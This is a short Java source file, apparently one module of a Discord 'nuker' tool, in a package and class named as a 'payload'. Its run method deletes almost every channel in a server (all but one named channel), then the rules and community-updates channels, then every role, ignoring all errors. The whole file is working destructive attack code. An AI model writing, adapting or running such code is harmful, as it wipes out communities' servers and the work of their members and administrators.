package de.corruptedbytes.payload.impl;

import net.dv8tion.jda.api.entities.Guild;

public class PayloadDelete implements Runnable {

	private Guild guild;
	private String name;

	public PayloadDelete(Guild guild, String name) {
		this.guild = guild;
		this.name = name;
	}

	@Override
	public void run() {
		guild.getChannels().forEach(key -> {
			if (key.getName() != name)
				try { key.delete().queue(); } catch (Exception ignored) { }
			else
				return;
		});
		
		try {
			guild.getRulesChannel().delete().queue();
			guild.getCommunityUpdatesChannel().delete().queue();
		} catch (Exception ignored) { }

		guild.getRoles().forEach(key -> {
			try {
				key.delete().queue();
			} catch (Exception ignored) { }
		});
	}

}
